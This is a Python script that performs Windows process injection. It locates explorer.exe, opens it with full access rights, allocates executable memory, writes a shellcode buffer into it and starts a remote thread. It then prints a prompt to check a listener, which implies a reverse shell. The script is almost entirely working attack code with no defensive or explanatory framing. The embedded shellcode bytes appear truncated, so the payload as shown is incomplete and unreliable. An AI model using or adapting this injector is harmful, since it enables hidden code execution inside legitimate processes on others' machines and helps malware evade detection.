# Importing the required module to obtain a process id 
import psutil
# Importing the required module to handle Windows API Calls
import ctypes
# Importing Windows Types from ctypes
from ctypes.wintypes import DWORD,LPWSTR,WORD,LPBYTE,HANDLE

# Grab a handle to kernel32.dll 
k_handle = ctypes.WinDLL("Kernel32.dll")

# Required WinAPIs for process injection (actually we will create a new thread for a given process)
	# 1 - OpenProcess 
	# 2 - VirtualAllocEx
	# 3 - WriteProcessMemory
	# 4 - CreateRemoteThread

# This function returns the process id by process name 
def get_pid (name):
    process = filter(lambda p: p.name() == name, psutil.process_iter())
    for i in process:
      return i.pid
      
def open_process(pid):
    # Access Rights
    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
    # Opening the Process by PID with Specific Access
    dwDesiredAccess = PROCESS_ALL_ACCESS
    bInheritHandle = False
    dwProcessId = pid
    # Calling the Windows API Call to Open the Process
    hProcess = k_handle.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
    # Check to see if we have a valid Handle to the process
    if hProcess <= 0:
        print("   [X] Could Not Grab Privileged Handle! Error Code: {0}".format(k_handle.GetLastError()))
    else:
        print("   [+] Privileged Handle Opened...")
    return hProcess
    
def virtul_alloc(hProcess,shellcode):
    memory_allocation_variable = k_handle.VirtualAllocEx(hProcess, 0, len(shellcode), 0x00001000, 0x40)
    return memory_allocation_variable
    
def write_proc_mem(hProcess,memory_allocation_variable,shellcode):
    k_handle.WriteProcessMemory(hProcess, memory_allocation_variable, shellcode, len(shellcode), 0)
    
def create_thread(hProcess, memory_allocation_variable):
    response = k_handle.CreateRemoteThread(hProcess, None, 0, memory_allocation_variable, 0, 0, 0)
    if not response:
        print("   [X] Failed to inject the code: {0}".format(k_handle.GetLastError()))
    else:
        print("   [+] Code injected! check your listener!")
    

# 1 - Before obtaining a handler for a process using OpenProcess(), we need the process ID  
proc_name = "explorer.exe"
pid = get_pid(proc_name)
print ("[+] Process ID for %s process is: %d" %(proc_name,pid))
# 2 - Obtaining a handler for the process 
print("[~] Trying to obtain a handler for %s process" %(proc_name))
hProcess = open_process(pid)
# 3 - Allocating a memory for our shellcode 
print("[~] Allocating a memory for the shellcode within the virtual address space of %s process" %(proc_name))
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41"
buf += b"\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48"
buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31"
buf += b"\xc9\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c"

memory_allocation_variable = virtul_alloc(hProcess,buf)
# 4 - Writing the data into the process 
print("[~] Writing our shellcode into the memory of %s process " %(proc_name))
write_proc_mem(hProcess,memory_allocation_variable,buf)
# 5 - Executing the Thread 
print ("[~] Executing the shellcode!")
create_thread(hProcess, memory_allocation_variable)

	
